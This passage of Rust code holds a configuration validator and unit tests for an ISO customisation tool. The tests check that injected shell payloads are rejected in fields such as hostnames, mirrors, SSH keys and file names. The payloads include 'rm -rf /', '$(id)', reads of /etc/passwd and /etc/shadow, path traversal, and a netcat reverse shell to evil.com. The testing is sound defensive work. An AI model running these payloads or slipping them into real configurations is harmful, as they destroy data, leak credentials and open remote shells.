        // cloud-init autoinstall requires storage.layout.password; without it
        // the installer fails or silently uses an empty LUKS passphrase, which
        // is a serious security defect. There is no interactive fallback in
        // unattended mode.
        if self.encrypt && self.encrypt_passphrase.is_none() {
            return Err(EngineError::InvalidConfig(
                "encrypt is enabled but no encrypt_passphrase was provided; \
                 Ubuntu cloud-init requires a LUKS passphrase in the storage layout"
                    .to_string(),
            ));
        }

        // Encryption also requires a storage_layout — without one, the autoinstall
        // YAML has no storage.layout block, so the LUKS password has nowhere to go
        // and encryption is silently skipped by cloud-init.
        if self.encrypt && self.storage_layout.is_none() {
            return Err(EngineError::InvalidConfig(
                "encrypt is enabled but no storage_layout was provided; \
                 Ubuntu cloud-init requires a named storage layout (e.g. 'lvm' or 'direct') \
                 to attach the LUKS passphrase to"
                    .to_string(),
            ));
        }

        // extra_packages — each entry is written as a bare line in Kickstart
        // %packages, interpolated into Mint preseed `pkgsel/include`, or
        // serialised into cloud-init YAML.  In Kickstart, a package name
        // containing a newline followed by `%end` would terminate the
        // %packages section early and allow injecting arbitrary directives.
        // Valid dpkg/rpm/pacman package names use alphanumeric, dash,
        // underscore, dot, plus, and colon (architecture qualifier).
        for pkg in &self.extra_packages {
            if pkg.is_empty() {
                return Err(EngineError::InvalidConfig(
                    "extra_packages entry must not be empty".to_string(),
                ));
            }
            if !pkg
                .chars()
                .all(|c| c.is_alphanumeric() || matches!(c, '-' | '_' | '.' | '+' | ':'))
            {
                return Err(EngineError::InvalidConfig(format!(
                    "extra_packages entry contains unsafe characters: {pkg:?} \
                     (only alphanumeric, dash, underscore, dot, plus, colon allowed)"
                )));
            }
        }

        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_url_source() {
        let source = IsoSource::from_raw("https://example.test/test.iso");
        assert!(matches!(source, IsoSource::Url(_)));
    }

    #[test]
    fn rejects_missing_overlay_dir() {
        let cfg = BuildConfig {
            name: "demo".to_string(),
            source: IsoSource::from_raw("/tmp/base.iso"),
            overlay_dir: Some(PathBuf::from("/definitely/missing")),
            output_label: None,
            profile: ProfileKind::Minimal,
            auto_scan: false,
            auto_test: false,
            scanning: ScanPolicy::default(),
            testing: TestingPolicy::default(),
            keep_workdir: false,
            expected_sha256: None,
        };

        assert!(cfg.validate().is_err());
    }

    #[test]
    fn inject_rejects_shell_metachar_in_username() {
        let cfg = InjectConfig {
            username: Some("admin; rm -rf /".into()),
            ..Default::default()
        };
        assert!(cfg.validate().is_err());
    }

    #[test]
    fn inject_rejects_shell_metachar_in_port() {
        let cfg = InjectConfig {
            firewall: FirewallConfig {
                allow_ports: vec!["22; nc -e /bin/sh evil.com".into()],
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(cfg.validate().is_err());
    }

    #[test]
    fn inject_accepts_valid_fields() {
        let cfg = InjectConfig {
            hostname: Some("web-server.lab".into()),
            username: Some("admin".into()),
            user: UserConfig {
                groups: vec!["docker".into(), "sudo".into()],
                ..Default::default()
            },
            firewall: FirewallConfig {
                allow_ports: vec!["22/tcp".into(), "80:443/tcp".into()],
                ..Default::default()
            },
            enable_services: vec!["sshd".into(), "docker.service".into()],
            ..Default::default()
        };
        assert!(cfg.validate().is_ok());
    }

    #[test]
    fn grub_default_allows_spaces_and_commas() {
        // GRUB menu titles routinely contain spaces and commas, e.g.
        // "Ubuntu, with Linux 6.x-generic" — these must not be rejected.
        let cfg = InjectConfig {
            grub: GrubConfig {
                default_entry: Some("Ubuntu, with Linux 6.x-generic".into()),
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(cfg.validate().is_ok());
    }

    #[test]
    fn grub_default_rejects_shell_metachar() {
        let cfg = InjectConfig {
            grub: GrubConfig {
                default_entry: Some("Ubuntu$(rm -rf /)".into()),
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(cfg.validate().is_err());
    }

    #[test]
    fn grub_default_accepts_slash_path() {
        // sed now uses | as delimiter so / in grub_default is safe.
        let cfg = InjectConfig {
            grub: GrubConfig {
                default_entry: Some("Ubuntu/recovery".into()),
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(cfg.validate().is_ok());
    }

    #[test]
    fn grub_cmdline_accepts_slash_path() {
        // sed now uses | as delimiter so / in cmdline params is safe.
        let cfg = InjectConfig {
            grub: GrubConfig {
                cmdline_extra: vec!["root=/dev/sda1".into()],
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(cfg.validate().is_ok());
    }

    #[test]
    fn grub_cmdline_accepts_valid_params() {
        let cfg = InjectConfig {
            grub: GrubConfig {
                cmdline_extra: vec![
                    "quiet".into(),
                    "splash".into(),
                    "nomodeset".into(),
                    "intel_iommu=on".into(),
                ],
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(cfg.validate().is_ok());
    }

    #[test]
    fn inject_rejects_shell_metachar_in_sudo_command() {
        let cfg = InjectConfig {
            user: UserConfig {
                sudo_commands: vec!["ALL; rm -rf /".into()],
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(cfg.validate().is_err());
    }

    #[test]
    fn inject_rejects_shell_metachar_in_apt_repo() {
        let cfg = InjectConfig {
            apt_repos: vec!["ppa:user/repo'; echo pwned".into()],
            ..Default::default()
        };
        assert!(cfg.validate().is_err());
    }

    #[test]
    fn inject_rejects_shell_metachar_in_mount() {
        let cfg = InjectConfig {
            mounts: vec!["/dev/sda1 /mnt ext4 defaults 0 0; whoami".into()],
            ..Default::default()
        };
        assert!(cfg.validate().is_err());
    }

    #[test]
    fn inject_rejects_shell_metachar_in_apt_mirror() {
        let cfg = InjectConfig {
            apt_mirror: Some("http://mirror.example.com$(id)".into()),
            ..Default::default()
        };
        assert!(cfg.validate().is_err());
    }

    #[test]
    fn inject_rejects_shell_metachar_in_proxy() {
        let cfg = InjectConfig {
            proxy: ProxyConfig {
                http_proxy: Some("http://proxy.example.com; cat /etc/passwd".into()),
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(cfg.validate().is_err());
    }

    #[test]
    fn inject_rejects_unsafe_dns_server() {
        let cfg = InjectConfig {
            network: NetworkConfig {
                dns_servers: vec!["8.8.8.8; rm -rf /".into()],
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(cfg.validate().is_err());
    }

    #[test]
    fn inject_rejects_unsafe_ntp_server() {
        let cfg = InjectConfig {
            network: NetworkConfig {
                ntp_servers: vec!["ntp.example.com$(id)".into()],
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(cfg.validate().is_err());
    }

    #[test]
    fn inject_accepts_valid_sudo_commands() {
        let cfg = InjectConfig {
            user: UserConfig {
                sudo_commands: vec!["/usr/bin/apt".into(), "/usr/sbin/reboot".into()],
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(cfg.validate().is_ok());
    }

    #[test]
    fn inject_accepts_valid_apt_repos() {
        let cfg = InjectConfig {
            apt_repos: vec!["deb http://archive.ubuntu.com/ubuntu noble main".into()],
            ..Default::default()
        };
        assert!(cfg.validate().is_ok());
    }

    #[test]
    fn inject_accepts_valid_mount_entries() {
        let cfg = InjectConfig {
            mounts: vec!["/dev/sda1 /mnt ext4 defaults 0 0".into()],
            ..Default::default()
        };
        assert!(cfg.validate().is_ok());
    }

    #[test]
    fn inject_rejects_bare_url_as_apt_repo() {
        // A raw URL is not a valid sources.list line (missing "deb " prefix).
        let cfg = InjectConfig {
            apt_repos: vec!["http://archive.ubuntu.com/ubuntu".into()],
            ..Default::default()
        };
        assert!(
            cfg.validate().is_err(),
            "bare URL without 'deb ' prefix must be rejected"
        );
    }

    #[test]
    fn inject_accepts_ppa_shorthand_as_apt_repo() {
        // PPA shorthands are handled via add-apt-repository in generated late-commands.
        let cfg = InjectConfig {
            apt_repos: vec!["ppa:deadsnakes/ppa".into()],
            ..Default::default()
        };
        assert!(
            cfg.validate().is_ok(),
            "ppa: shorthand must be accepted (handled via add-apt-repository)"
        );
    }

    #[test]
    fn inject_accepts_deb_src_apt_repo() {
        let cfg = InjectConfig {
            apt_repos: vec!["deb-src http://archive.ubuntu.com/ubuntu noble main".into()],
            ..Default::default()
        };
        assert!(cfg.validate().is_ok(), "deb-src line must be accepted");
    }

    #[test]
    fn scan_policy_defaults_enable_local_checks() {
        let policy = ScanPolicy::default();

        assert!(policy.enable_sbom);
        assert!(policy.enable_trivy);
        assert!(policy.enable_secrets_scan);
        assert!(!policy.enable_syft_grype);
        assert!(!policy.enable_open_scap);
    }

    // ── IsoSource ────────────────────────────────────────────────────────────

    #[test]
    fn iso_source_from_raw_detects_https_url() {
        let src = IsoSource::from_raw("https://releases.ubuntu.com/noble/ubuntu.iso");
        assert!(src.is_remote());
        assert!(matches!(src, IsoSource::Url(_)));
    }

    #[test]
    fn iso_source_from_raw_detects_http_url() {
        let src = IsoSource::from_raw("http://mirror.example.com/ubuntu.iso");
        assert!(src.is_remote());
    }

    #[test]
    fn iso_source_from_raw_treats_local_path_as_path() {
        let src = IsoSource::from_raw("/tmp/ubuntu.iso");
        assert!(!src.is_remote());
        assert!(matches!(src, IsoSource::Path(_)));
    }

    #[test]
    fn iso_source_display_value_url() {
        let url = "https://example.com/ubuntu.iso";
        let src = IsoSource::from_raw(url);
        assert_eq!(src.display_value(), url);
    }

    #[test]
    fn iso_source_display_value_path() {
        let src = IsoSource::from_raw("/tmp/ubuntu.iso");
        assert_eq!(src.display_value(), "/tmp/ubuntu.iso");
    }

    // ── InjectConfig validate edge cases ─────────────────────────────────────

    #[test]
    fn inject_rejects_semicolon_in_hostname() {
        let cfg = InjectConfig {
            hostname: Some("bad;host".into()),
            ..Default::default()
        };
        assert!(cfg.validate().is_err());
    }

    #[test]
    fn inject_accepts_hostname_with_dash_and_dot() {
        let cfg = InjectConfig {
            hostname: Some("my-host.example.com".into()),
            ..Default::default()
        };
        assert!(cfg.validate().is_ok());
    }

    #[test]
    fn inject_rejects_newline_in_realname() {
        let cfg = InjectConfig {
            realname: Some("Jane\nDoe".into()),
            ..Default::default()
        };
        assert!(cfg.validate().is_err());
    }

    #[test]
    fn inject_accepts_realname_with_space() {
        let cfg = InjectConfig {
            realname: Some("Jane Doe".into()),
            ..Default::default()
        };
        assert!(cfg.validate().is_ok());
    }

    #[test]
    fn inject_rejects_backtick_in_service_name() {
        let cfg = InjectConfig {
            enable_services: vec!["ssh`whoami`".into()],
            ..Default::default()
        };
        assert!(cfg.validate().is_err());
    }

    // ── BuildConfig validation ────────────────────────────────────────────────

    #[test]
    fn build_config_from_yaml_str_minimal() {
        // IsoSource is #[serde(untagged)] — deserializes from bare string
        let yaml = "name: test-build\nsource: /tmp/ubuntu.iso\n";
        let result = BuildConfig::from_yaml_str(yaml);
        assert!(result.is_ok(), "parse failed: {result:?}");
    }

    #[test]
    fn build_config_rejects_empty_name() {
        let yaml = "name: ''\nsource: /tmp/ubuntu.iso\n";
        let result = BuildConfig::from_yaml_str(yaml);
        assert!(result.is_err());
    }

    // ── IsoSource edge cases ──────────────────────────────────────────────────

    #[test]
    fn iso_source_from_raw_uppercase_http_treated_as_path() {
        // `from_raw` does an ASCII-case-sensitive prefix check; uppercase HTTP:// is
        // NOT a recognised scheme and must fall through to path.
        let src = IsoSource::from_raw("HTTP://example.com/file.iso");
        assert!(
            matches!(src, IsoSource::Path(_)),
            "uppercase scheme must be treated as path, not URL"
        );
    }

    #[test]
    fn iso_source_from_raw_empty_string_is_path() {
        let src = IsoSource::from_raw("");
        assert!(matches!(src, IsoSource::Path(_)));
    }

    #[test]
    fn iso_source_display_value_round_trips() {
        let url = "https://example.com/ubuntu.iso";
        let src = IsoSource::from_raw(url);
        assert_eq!(src.display_value(), url);

        let path = "/tmp/local.iso";
        let src = IsoSource::from_raw(path);
        assert_eq!(src.display_value(), path);
    }

    #[test]
    fn iso_source_is_remote_only_for_url() {
        assert!(IsoSource::from_raw("https://cdn.example.com/a.iso").is_remote());
        assert!(!IsoSource::from_raw("/tmp/local.iso").is_remote());
    }

    // ── BuildConfig validation edge cases ─────────────────────────────────────

    #[test]
    fn build_config_rejects_whitespace_only_name() {
        let yaml = "name: '   '\nsource: /tmp/ubuntu.iso\n";
        let result = BuildConfig::from_yaml_str(yaml);
        assert!(result.is_err(), "whitespace-only name must be rejected");
    }

    #[test]
    fn build_config_rejects_blank_output_label() {
        let cfg = BuildConfig {
            name: "build".to_string(),
            source: IsoSource::from_raw("/tmp/test.iso"),
            overlay_dir: None,
            output_label: Some("   ".to_string()), // blank after trim
            profile: ProfileKind::Minimal,
            auto_scan: false,
            auto_test: false,
            scanning: ScanPolicy::default(),
            testing: TestingPolicy::default(),
            keep_workdir: false,
            expected_sha256: None,
        };
        assert!(
            cfg.validate().is_err(),
            "blank output_label must be rejected"
        );
    }

    #[test]
    fn build_config_rejects_output_label_too_long() {
        let cfg = BuildConfig {
            name: "build".to_string(),
            source: IsoSource::from_raw("/tmp/test.iso"),
            overlay_dir: None,
            output_label: Some("A".repeat(33)), // 33 chars > 32 max
            profile: ProfileKind::Minimal,
            auto_scan: false,
            auto_test: false,
            scanning: ScanPolicy::default(),
            testing: TestingPolicy::default(),
            keep_workdir: false,
            expected_sha256: None,
        };
        assert!(
            cfg.validate().is_err(),
            "output_label longer than 32 chars must be rejected"
        );
    }

    #[test]
    fn build_config_accepts_output_label_exactly_32_chars() {
        let cfg = BuildConfig {
            name: "build".to_string(),
            source: IsoSource::from_raw("/tmp/test.iso"),
            overlay_dir: None,
            output_label: Some("A".repeat(32)),
            profile: ProfileKind::Minimal,
            auto_scan: false,
            auto_test: false,
            scanning: ScanPolicy::default(),
            testing: TestingPolicy::default(),
            keep_workdir: false,
            expected_sha256: None,
        };
        assert!(
            cfg.validate().is_ok(),
            "32-char output_label must be accepted"
        );
    }

    #[test]
    fn build_config_rejects_output_label_with_control_char() {
        for bad in &[
            "LABEL\nINJECT",
            "LABEL\rINJECT",
            "LABEL\0INJECT",
            "LABEL\tINJECT",
        ] {
            let cfg = BuildConfig {
                name: "build".to_string(),
                source: IsoSource::from_raw("/tmp/test.iso"),
                overlay_dir: None,
                output_label: Some((*bad).to_string()),
                profile: ProfileKind::Minimal,
                auto_scan: false,
                auto_test: false,
                scanning: ScanPolicy::default(),
                testing: TestingPolicy::default(),
                keep_workdir: false,
                expected_sha256: None,
            };
            assert!(
                cfg.validate().is_err(),
                "output_label {:?} with control char must be rejected",
                bad
            );
        }
    }

    #[test]
    fn build_config_rejects_auto_test_without_smoke() {
        let testing = TestingPolicy {
            smoke: false,
            ..Default::default()
        };
        let cfg = BuildConfig {
            name: "build".to_string(),
            source: IsoSource::from_raw("/tmp/test.iso"),
            overlay_dir: None,
            output_label: None,
            profile: ProfileKind::Minimal,
            auto_scan: false,
            auto_test: true,
            scanning: ScanPolicy::default(),
            testing,
            keep_workdir: false,
            expected_sha256: None,
        };
        assert!(
            cfg.validate().is_err(),
            "auto_test=true with smoke=false must be rejected"
        );
    }

    // ── InjectConfig::validate edge cases ─────────────────────────────────────

    #[test]
    fn inject_accepts_ipv6_ntp_server() {
        // IPv6 addresses are valid NTP/DNS server addresses; the validator
        // uses is_safe_network_addr which allows colons for IPv6.
        let cfg = InjectConfig {
            network: NetworkConfig {
                ntp_servers: vec!["2001:db8::1".to_string()],
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(
            cfg.validate().is_ok(),
            "IPv6 NTP address must be accepted by the network-address validator"
        );
    }

    #[test]
    fn inject_accepts_ipv6_dns_server() {
        let cfg = InjectConfig {
            network: NetworkConfig {
                dns_servers: vec!["2001:4860:4860::8888".to_string()],
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(
            cfg.validate().is_ok(),
            "IPv6 DNS address must be accepted by the network-address validator"
        );
    }

    #[test]
    fn inject_rejects_dns_with_shell_metachar() {
        // A DNS entry with a semicolon is still unsafe and must be rejected.
        let cfg = InjectConfig {
            network: NetworkConfig {
                dns_servers: vec!["1.1.1.1; rm -rf /".to_string()],
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(
            cfg.validate().is_err(),
            "DNS entry with shell metacharacter must be rejected"
        );
    }

    #[test]
    fn inject_accepts_hostname_with_dots() {
        // RFC-1123 hostnames use dots — the validator allows them.
        let cfg = InjectConfig {
            hostname: Some("my.host.example.com".into()),
            ..Default::default()
        };
        assert!(cfg.validate().is_ok());
    }

    #[test]
    fn inject_rejects_hostname_with_shell_metachar() {
        let cfg = InjectConfig {
            hostname: Some("host$(id)".into()),
            ..Default::default()
        };
        assert!(cfg.validate().is_err());
    }

    #[test]
    fn inject_rejects_realname_with_single_quote() {
        let cfg = InjectConfig {
            realname: Some("O'Brien".into()),
            ..Default::default()
        };
        assert!(
            cfg.validate().is_err(),
            "single quote in realname is a shell metachar and must be rejected"
        );
    }

    #[test]
    fn inject_accepts_grub_default_with_slash() {
        // sed now uses | as delimiter so / in grub_default is safe.
        let cfg = InjectConfig {
            grub: GrubConfig {
                default_entry: Some("Ubuntu/recovery".into()),
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(
            cfg.validate().is_ok(),
            "grub_default with '/' must be accepted (sed uses | delimiter)"
        );
    }

    #[test]
    fn inject_rejects_sysctl_value_with_semicolon() {
        let cfg = InjectConfig {
            sysctl: vec![("net.ipv4.ip_forward".into(), "1; rm -rf /".into())],
            ..Default::default()
        };
        assert!(cfg.validate().is_err());
    }

    #[test]
    fn inject_rejects_apt_repo_without_deb_prefix() {
        // Arbitrary text that is not a valid sources.list line must be caught.
        let cfg = InjectConfig {
            apt_repos: vec!["http://ppa.launchpad.net/user/ppa/ubuntu".into()],
            ..Default::default()
        };
        assert!(
            cfg.validate().is_err(),
            "apt_repo missing 'deb ' prefix must be rejected"
        );
    }

    #[test]
    fn inject_accepts_valid_deb_src_apt_repo() {
        let cfg = InjectConfig {
            apt_repos: vec![
                "deb http://archive.ubuntu.com/ubuntu noble main".into(),
                "deb-src http://archive.ubuntu.com/ubuntu noble main".into(),
            ],
            ..Default::default()
        };
        assert!(cfg.validate().is_ok(), "valid deb/deb-src lines must pass");
    }

    #[test]
    fn inject_rejects_apt_mirror_with_shell_metachar() {
        let cfg = InjectConfig {
            apt_mirror: Some("http://mirror.example.com/ubuntu; malicious".into()),
            ..Default::default()
        };
        assert!(cfg.validate().is_err());
    }

    #[test]
    fn inject_rejects_proxy_with_backtick() {
        let cfg = InjectConfig {
            proxy: ProxyConfig {
                http_proxy: Some("http://proxy.example.com:3128`whoami`".into()),
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(cfg.validate().is_err());
    }

    #[test]
    fn inject_rejects_sudo_command_with_pipe() {
        let cfg = InjectConfig {
            user: UserConfig {
                sudo_commands: vec!["/usr/bin/systemctl | cat /etc/shadow".into()],
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(cfg.validate().is_err());
    }

    #[test]
    fn inject_accepts_valid_sudo_command() {
        let cfg = InjectConfig {
            user: UserConfig {
                sudo_commands: vec!["/usr/bin/systemctl".into()],
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(cfg.validate().is_ok());
    }

    #[test]
    fn inject_accepts_empty_string_for_validated_fields() {
        // is_safe_identifier returns Ok on empty input — validated fields may be empty.
        let cfg = InjectConfig {
            hostname: Some(String::new()),
            username: Some(String::new()),
            ..Default::default()
        };
        assert!(cfg.validate().is_ok(), "empty strings must be allowed");
    }

    // ── out_name validation ────────────────────────────────────────────────────

    #[test]
    fn inject_rejects_out_name_with_path_traversal() {
        let cfg = InjectConfig {
            out_name: "../../etc/passwd".into(),
            ..Default::default()
        };
        assert!(
            cfg.validate().is_err(),
            "out_name with path traversal must be rejected"
        );
    }

    #[test]
    fn inject_rejects_out_name_with_shell_metachar() {
        let cfg = InjectConfig {
            out_name: "output$(id).iso".into(),
            ..Default::default()
        };
        assert!(
            cfg.validate().is_err(),
            "out_name with shell metacharacter must be rejected"
        );
    }

    #[test]
    fn inject_accepts_valid_out_name() {
        let cfg = InjectConfig {
            out_name: "my-custom-ubuntu.iso".into(),
            ..Default::default()
        };
        assert!(cfg.validate().is_ok(), "plain filename must be accepted");
    }

    // ── DNF mirror / repo validation ───────────────────────────────────────────

    #[test]
    fn inject_rejects_dnf_mirror_with_sed_delimiter() {
        let cfg = InjectConfig {
            dnf_mirror: Some("https://mirror.example.com|evil".into()),
            ..Default::default()
        };
        assert!(
            cfg.validate().is_err(),
            "dnf_mirror with | (sed delimiter) must be rejected"
        );
    }

    #[test]
    fn inject_accepts_valid_dnf_mirror() {
        let cfg = InjectConfig {
            dnf_mirror: Some("https://mirror.example.com/fedora".into()),
            ..Default::default()
        };
        assert!(cfg.validate().is_ok(), "clean dnf_mirror URL must pass");
    }

    #[test]
    fn inject_rejects_dnf_repo_url_with_single_quote() {
        let cfg = InjectConfig {
            dnf_repos: vec!["https://evil.example.com/'; rm -rf /".into()],
            ..Default::default()
        };
        assert!(
            cfg.validate().is_err(),
            "dnf_repo URL with single quote must be rejected"
        );
    }

    #[test]
    fn inject_accepts_dnf_repo_stanza_with_dollar_sign() {
        // $releasever and $basearch are standard DNF stanza variables.
        // They go through a heredoc (not single-quoted shell), so $ is safe.
        let cfg = InjectConfig {
            dnf_repos: vec!["[rpmfusion-free]\nbaseurl=https://mirrors.rpmfusion.org/free/fedora/$releasever/$basearch\nenabled=1".into()],
            ..Default::default()
        };
        assert!(
            cfg.validate().is_ok(),
            "dnf_repo stanza with $releasever must be accepted"
        );
    }

    // ── Pacman mirror / repo validation ───────────────────────────────────────

    #[test]
    fn inject_rejects_pacman_mirror_with_single_quote() {
        let cfg = InjectConfig {
            pacman_mirror: Some("https://mirror.example.com/arch'; evil".into()),
            ..Default::default()
        };
        assert!(
            cfg.validate().is_err(),
            "pacman_mirror with single quote must be rejected (breaks shell quoting)"
        );
    }

    #[test]
    fn inject_accepts_pacman_mirror_with_dollar_sign() {
        // Pacman mirror URLs are single-quoted in shell; $ is literal in single-quoted strings.
        let cfg = InjectConfig {
            pacman_mirror: Some("https://mirror.pkgbuild.com".into()),
            ..Default::default()
        };
        assert!(cfg.validate().is_ok(), "clean pacman_mirror URL must pass");
    }

    #[test]
    fn inject_rejects_pacman_repo_with_newline() {
        let cfg = InjectConfig {
            pacman_repos: vec!["Server = https://good.mirror.com\nrm -rf /".into()],
            ..Default::default()
        };
        assert!(
            cfg.validate().is_err(),
            "pacman_repo with newline must be rejected (would break echo command)"
        );
    }

    #[test]
    fn inject_accepts_valid_pacman_repo_entry() {
        // $repo and $arch are pacman template variables — safe in single-quoted strings.
        let cfg = InjectConfig {
            pacman_repos: vec!["Server = https://mirror.pkgbuild.com/$repo/os/$arch".into()],
            ..Default::default()
        };
        assert!(
            cfg.validate().is_ok(),
            "standard pacman Server= line with template vars must be accepted"
        );
    }

    // ── DNF heredoc sentinel collision ────────────────────────────────────────

    #[test]
    fn inject_rejects_dnf_repo_stanza_containing_heredoc_sentinel() {
        // A line that is exactly the heredoc sentinel would terminate the
        // `cat > .repo << 'FORGEISO_REPO_EOF'` heredoc early, producing a
        // truncated .repo file.
        let cfg = InjectConfig {
            dnf_repos: vec![
                "[myrepo]\nbaseurl=https://mirror.example.com\nFORGEISO_REPO_EOF\ngpgcheck=1"
                    .into(),
            ],
            ..Default::default()
        };
        assert!(
            cfg.validate().is_err(),
            "dnf_repo stanza containing heredoc sentinel line must be rejected"
        );
    }

    #[test]
    fn inject_accepts_dnf_repo_stanza_with_sentinel_as_substring() {
        // The sentinel only terminates if it appears alone on a line — as a
        // substring of a longer line it is harmless.
        let cfg = InjectConfig {
            dnf_repos: vec![
                "[myrepo]\n# generated by FORGEISO_REPO_EOF_marker\nbaseurl=https://mirror.example.com\n".into(),
            ],
            ..Default::default()
        };
        assert!(
            cfg.validate().is_ok(),
            "sentinel as substring of a longer line must be accepted"
        );
    }

    // ── SSH key validation ─────────────────────────────────────────────────────

    #[test]
    fn inject_rejects_ssh_key_with_single_quote() {
        // Mint preseed uses printf '%s\n' 'KEY' — a single quote in the key
        // content would break out of the single-quoting and allow arbitrary
        // shell injection.
        use crate::config::SshConfig;
        let cfg = InjectConfig {
            ssh: SshConfig {
                authorized_keys: vec!["ssh-ed25519 AAAA'; evil_cmd #".into()],
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(
            cfg.validate().is_err(),
            "authorized_key with single quote must be rejected"
        );
    }

    #[test]
    fn inject_rejects_ssh_key_containing_heredoc_sentinel() {
        // Defense in depth: even though the heredoc approach is no longer used,
        // a key whose content matches the old FORGEISO_KEY_EOF sentinel as a
        // standalone line is still rejected.  If the heredoc approach is ever
        // reintroduced, this check prevents early termination.
        use crate::config::SshConfig;
        let cfg = InjectConfig {
            ssh: SshConfig {
                authorized_keys: vec![
                    "ssh-ed25519 AAAA...\nFORGEISO_KEY_EOF\nssh-ed25519 BBBB...".into()
                ],
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(
            cfg.validate().is_err(),
            "authorized_key containing heredoc sentinel as a standalone line must be rejected"
        );
    }

    #[test]
    fn inject_accepts_valid_ssh_key() {
        // A well-formed ed25519 public key with a realistic comment must be accepted.
        use crate::config::SshConfig;
        let cfg = InjectConfig {
            ssh: SshConfig {
                authorized_keys: vec![
                    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFORGEISo_KEY_EOF_not_a_sentinel user@host".into(),
                ],
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(
            cfg.validate().is_ok(),
            "valid SSH public key must be accepted"
        );
    }

    // ── Swap filename ──────────────────────────────────────────────────────────

    #[test]
    fn inject_rejects_relative_swap_filename() {
        // A relative filename like "myswap" produces /targetmyswap (missing the
        // path separator), and mkswap/fstab would reference a non-existent path.
        let cfg = InjectConfig {
            swap: Some(SwapConfig {
                size_mb: 1024,
                filename: Some("myswap".into()),
                swappiness: None,
            }),
            ..Default::default()
        };
        assert!(
            cfg.validate().is_err(),
            "relative swap_filename must be rejected"
        );
    }

    #[test]
    fn inject_accepts_absolute_swap_filename() {
        // The default "/swapfile" and any absolute path must be accepted.
        let cfg = InjectConfig {
            swap: Some(SwapConfig {
                size_mb: 1024,
                filename: Some("/swap/swapfile".into()),
                swappiness: None,
            }),
            ..Default::default()
        };
        assert!(
            cfg.validate().is_ok(),
            "absolute swap_filename must be accepted"
        );
    }

    // ── SSH key double-quote and newline validation ────────────────────────────

    #[test]
    fn inject_rejects_ssh_key_with_double_quote() {
        // Kickstart wraps keys in double quotes: sshkey --username=user "KEY"
        // A double quote inside the key comment would terminate the argument early
        // and allow injection into the kickstart file.
        use crate::config::SshConfig;
        let cfg = InjectConfig {
            ssh: SshConfig {
                authorized_keys: vec![r#"ssh-ed25519 AAAA user@"hostname""#.into()],
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(
            cfg.validate().is_err(),
            "SSH key with double quote must be rejected"
        );
    }

    #[test]
    fn inject_rejects_ssh_key_with_newline() {
        // Newlines in an SSH key break line-oriented directives (Kickstart sshkey,
        // preseed late_command) and are not valid in authorized_keys entries.
        use crate::config::SshConfig;
        let cfg = InjectConfig {
            ssh: SshConfig {
                authorized_keys: vec!["ssh-ed25519 AAAA\nmalicious-command".into()],
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(
            cfg.validate().is_err(),
            "SSH key with embedded newline must be rejected"
        );
    }

    #[test]
    fn inject_rejects_swap_filename_with_dotdot() {
        // A swap filename containing .. could produce /target/../etc/passwd
        // (resolving to /etc/passwd on the running installer system) via
        // `fallocate -l {mb}M /target{fname}`.  The validator must block it.
        let cfg = InjectConfig {
            swap: Some(crate::config::SwapConfig {
                size_mb: 512,
                filename: Some("/../etc/passwd".to_string()),
                swappiness: None,
            }),
            ..Default::default()
        };
        assert!(
            cfg.validate().is_err(),
            "swap_filename with .. path traversal must be rejected"
        );
    }

    #[test]
    fn inject_accepts_valid_swap_filename() {
        let cfg = InjectConfig {
            swap: Some(crate::config::SwapConfig {
                size_mb: 1024,
                filename: Some("/swapfile".to_string()),
                swappiness: Some(10),
            }),
            ..Default::default()
        };
        assert!(
            cfg.validate().is_ok(),
            "valid absolute swap_filename must be accepted"
        );
    }

    #[test]
    fn encrypt_without_passphrase_is_rejected() {
        let cfg = InjectConfig {
            encrypt: true,
            encrypt_passphrase: None,
            ..Default::default()
        };
        let err = cfg.validate().unwrap_err();
        let msg = err.to_string();
        assert!(
            msg.contains("encrypt_passphrase"),
            "error must mention encrypt_passphrase: {msg}"
        );
    }

    #[test]
    fn encrypt_with_passphrase_is_accepted() {
        let cfg = InjectConfig {
            encrypt: true,
            encrypt_passphrase: Some("correct-horse-battery-staple".to_string()),
            storage_layout: Some("lvm".to_string()),
            ..Default::default()
        };
        assert!(
            cfg.validate().is_ok(),
            "encrypt=true with passphrase + storage_layout must pass validation"
        );
    }

    #[test]
    fn encrypt_without_storage_layout_is_rejected() {
        // Regression: encrypt=true without storage_layout was silently accepted
        // but the YAML had no storage.layout block to attach the LUKS password to,
        // causing encryption to be silently skipped by cloud-init.
        let cfg = InjectConfig {
            encrypt: true,
            encrypt_passphrase: Some("supersecret".to_string()),
            storage_layout: None,
            ..Default::default()
        };
        let err = cfg.validate().unwrap_err();
        let msg = err.to_string();
        assert!(
            msg.contains("storage_layout"),
            "error must mention storage_layout: {msg}"
        );
    }

    #[test]
    fn wallpaper_filename_rejects_shell_injection() {
        // The wallpaper filename is embedded unquoted in a `cp /cdrom/wallpaper/{fname}` shell
        // command — a semicolon, space, or other metacharacter allows code injection.
        for bad in &[
            "/tmp/foo;bar.jpg",      // semicolon in filename
            "/tmp/my wallpaper.jpg", // space in filename
            "/tmp/wall$(uname).jpg", // dollar-paren in filename
            "/tmp/wall`id`.jpg",     // backtick in filename
            "/tmp/wall'inject'.jpg", // single-quote in filename
        ] {
            let cfg = InjectConfig {
                wallpaper: Some(PathBuf::from(bad)),
                ..Default::default()
            };
            assert!(
